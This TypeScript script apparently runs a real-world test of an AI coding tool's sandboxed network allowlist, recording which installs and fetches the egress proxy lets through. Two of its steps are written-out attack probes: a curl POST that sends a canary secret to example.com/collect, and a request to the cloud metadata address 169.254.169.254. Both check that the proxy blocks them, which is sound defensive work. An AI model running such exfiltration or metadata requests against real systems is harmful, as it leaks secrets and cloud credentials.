/**
 * alpha.6 scoped-egress dogfood (§67–§70).
 *
 * Everything else in this milestone runs against a controlled topology the suite
 * built for itself, which is the right way to test a mechanism and a poor way to
 * find out what it is like to use. This script runs the real thing: a real
 * package install, over the real internet, through the real proxy, with a strict
 * allowlist — and records what actually happened, including the friction.
 *
 * §70 is explicit that the friction is part of the result: *"Do not hide
 * strict-egress friction."* A milestone that made an approval meaningful and
 * also made every npm install fail twice has bought something and paid for it,
 * and the release notes need both numbers.
 *
 *     node evals/experiments/alpha6-egress-dogfood.ts
 *
 * Needs a docker daemon, the node:22-bookworm image, and outbound HTTPS.
 */

import { mkdtemp, rm, writeFile, mkdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import * as path from 'node:path';

import { canonicalize, type CanonicalPath } from '../../src/util/paths.ts';
import { Redactor } from '../../src/security/redactor.ts';
import { createLogger } from '../../src/util/logger.ts';
import { ContainerExecutionBackend, defaultContainerConfig } from '../../src/execution/container.ts';
import type { CapabilityProfile } from '../../src/execution/backend.ts';
import type { EgressAuditRecord } from '../../src/security/egress-proxy/proxy.ts';

/**
 * A canary the kernel has never seen (§69).
 *
 * Not registered with SecretBroker, not matched by the redactor's patterns.
 * Content-based defences cannot help here by construction, so if it fails to
 * reach a denied host, destination enforcement is the only thing that stopped it.
 */
const CANARY = 'ALPHA6_DOGFOOD_CANARY_7d21f9ae';

interface Step {
  name: string;
  hosts: string[] | 'unrestricted';
  command: string;
  exitCode: number | null;
  durationMs: number;
  stdoutHead: string;
  deniedHosts: string[];
  allowedHosts: string[];
  reasons: string[];
  setupMs?: number;
}

const steps: Step[] = [];

async function main(): Promise<void> {
  const base = await mkdtemp(path.join(tmpdir(), 'mycoder-alpha6-dogfood-'));
  const workspace = path.join(base, 'workspace');
  await mkdir(workspace, { recursive: true });
  // A throwaway package project (§67). `is-number` is chosen for being tiny and
  // dependency-free: the interesting variable is the network, not the install.
  await writeFile(
    path.join(workspace, 'package.json'),
    JSON.stringify({ name: 'alpha6-dogfood', version: '1.0.0', private: true }, null, 2),
    'utf8',
  );

  // npm needs somewhere to write. The workspace base is mounted read-only by
  // design (ADR-0014 §12), so `node_modules` has to exist and be declared a
  // generated path before the install can land — which is itself a small piece
  // of dogfood: a scoped-egress install fails on *writes* before it ever gets to
  // the network, and the error for that says nothing about the network.
  await mkdir(path.join(workspace, 'node_modules'), { recursive: true });

  const root = (await canonicalize(workspace, { cwd: base })).path;
  let audit: EgressAuditRecord[] = [];
  let setupMs = 0;

  const backend = await ContainerExecutionBackend.create({
    workspaceRoot: root,
    redactor: new Redactor(),
    config: { ...defaultContainerConfig() },
    // Dogfood finding D-A6-2: this machine's resolver maps public hostnames into
    // RFC 2544 benchmarking space (198.18.0.0/15) and NATs them onward, so the
    // strict §23 address policy denies every real destination. Enabled here so
    // the run measures scoped-egress *usability* rather than re-measuring the
    // address check, which the controlled suite already covers. Set from the
    // environment so the transcript records which mode produced it.
    egressAllowBenchmarkRange: process.env.DOGFOOD_ALLOW_BENCHMARK_RANGE === '1',
    logger: createLogger({ level: 'silent', scope: 'dogfood' }),
    generatedDirs: [path.join(root, 'node_modules') as CanonicalPath],
    onEgressAudit: (records, timing) => {
      audit = [...records];
      setupMs = timing.totalSetupMs;
    },
  });

  const profile = (network: CapabilityProfile['network']): CapabilityProfile => ({
    readRoots: [root],
    writeRoots: [root],
    allowExec: true,
    network,
    envAllow: [],
    secretInjections: [],
    timeoutMs: 300_000,
    maxOutputBytes: 4 * 1024 * 1024,
  });

  const step = async (name: string, hosts: string[] | 'unrestricted', command: string): Promise<Step> => {
    audit = [];
    setupMs = 0;
    const network: CapabilityProfile['network'] =
      hosts === 'unrestricted' ? { unrestricted: true } : { hosts };
    const executor = await backend.enforce(profile(network));
    const started = Date.now();
    let exitCode: number | null = null;
    let stdout = '';
    try {
      const result = await executor.exec({
        argv: ['sh', '-c', command],
        cwd: root,
        timeoutMs: 300_000,
      });
      exitCode = result.exitCode;
      stdout = `${result.stdout}\n${result.stderr}`;
    } catch (e) {
      stdout = e instanceof Error ? e.message : String(e);
    } finally {
      executor.dispose();
    }
    const record: Step = {
      name,
      hosts,
      command,
      exitCode,
      durationMs: Date.now() - started,
      stdoutHead: stdout.trim().split('\n').slice(0, 6).join('\n').slice(0, 600),
      deniedHosts: [...new Set(audit.filter((r) => r.decision === 'denied').map((r) => r.host ?? '?'))],
      allowedHosts: [...new Set(audit.filter((r) => r.decision === 'allowed').map((r) => r.host ?? '?'))],
      reasons: [...new Set(audit.map((r) => r.reason))],
      ...(setupMs > 0 ? { setupMs } : {}),
    };
    steps.push(record);
    process.stdout.write(
      `\n## ${name}\n  hosts    : ${hosts === 'unrestricted' ? 'UNRESTRICTED' : hosts.join(', ')}\n` +
        `  exit     : ${exitCode}\n  duration : ${record.durationMs}ms (setup ${setupMs}ms)\n` +
        `  allowed  : ${record.allowedHosts.join(', ') || '—'}\n` +
        `  denied   : ${record.deniedHosts.join(', ') || '—'}\n` +
        `  reasons  : ${record.reasons.join(', ') || '—'}\n` +
        `  output   : ${record.stdoutHead.replace(/\n/g, '\n             ')}\n`,
    );
    return record;
  };

  try {
    // 1. The naive first attempt: approve the registry and nothing else. This is
    //    what a user would actually do, and §68 wants to know whether it works.
    await step(
      'npm install with only registry.npmjs.org approved',
      ['registry.npmjs.org'],
      // `--no-save`: the workspace base is read-only (ADR-0014 §12), so an
      // install that rewrites `package.json` fails on the *filesystem* before it
      // reaches the network. That is a real finding and it is recorded as one —
      // but it is not an egress finding, and letting it mask the egress result
      // would make this step measure the wrong thing.
      'cd /workspace && npm install --no-save --no-audit --no-fund is-number@7.0.0 2>&1 | tail -8; ' +
        "echo \"installed=$(ls node_modules 2>/dev/null | tr '\\n' ' ')\"",
    );

    // 2. A plain HTTPS fetch of a registry document — the narrowest useful thing.
    await step(
      'plain HTTPS GET of an approved registry document',
      ['registry.npmjs.org'],
      'curl -sS --max-time 60 -o /tmp/meta.json -w "status=%{http_code} bytes=%{size_download}\\n" ' +
        'https://registry.npmjs.org/is-number',
    );

    // 3. Git over HTTPS to an approved host (§67's alternative workflow).
    await step(
      'git ls-remote over scoped HTTPS',
      ['github.com'],
      'git ls-remote --heads https://github.com/nodejs/node.git HEAD 2>&1 | head -3; echo "exit=$?"',
    );

    // 4. A second host the workflow discovers but the approval never covered.
    await step(
      'an unapproved second host is refused',
      ['registry.npmjs.org'],
      'curl -sS --max-time 30 -w "\\nstatus=%{http_code}\\n" https://github.com/ 2>&1 | tail -4',
    );

    // 5. The same command with the expanded approval (§68's retry).
    await step(
      'the same second host, after the approval is expanded',
      ['registry.npmjs.org', 'github.com'],
      'curl -sS --max-time 30 -o /dev/null -w "status=%{http_code}\\n" https://github.com/',
    );

    // 6. §69: exfiltrate an unknown canary to a host that was never approved.
    await step(
      'unknown canary to an unapproved destination',
      ['registry.npmjs.org'],
      `curl -sS --max-time 30 -w "\\nstatus=%{http_code}\\n" -X POST --data "leak=${CANARY}" ` +
        'https://example.com/collect 2>&1 | tail -4',
    );

    // 7. The metadata endpoint, which is the address every cloud exfiltration
    //    story starts at.
    await step(
      'cloud metadata endpoint by IP',
      ['registry.npmjs.org'],
      'curl -sS --max-time 15 -w "\\nstatus=%{http_code}\\n" http://169.254.169.254/latest/meta-data/ 2>&1 | tail -4',
    );
  } finally {
    await backend.close();
    await rm(base, { recursive: true, force: true }).catch(() => {});
  }

  const setups = steps
    .map((s) => s.setupMs ?? 0)
    .filter((n) => n > 0)
    .sort((a, b) => a - b);
  process.stdout.write(
    `\n=== summary ===\nsteps: ${steps.length}\n` +
      `setup median: ${setups[Math.floor(setups.length / 2)] ?? 0}ms, range ${setups[0] ?? 0}–${setups.at(-1) ?? 0}ms\n` +
      `canary reached a denied host: ${steps.some((s) => s.name.includes('canary') && s.reasons.includes('allowed')) ? 'YES — STOP' : 'no'}\n`,
  );
  process.stdout.write(`\n${JSON.stringify({ steps, canary: CANARY }, null, 2)}\n`);
}

await main();
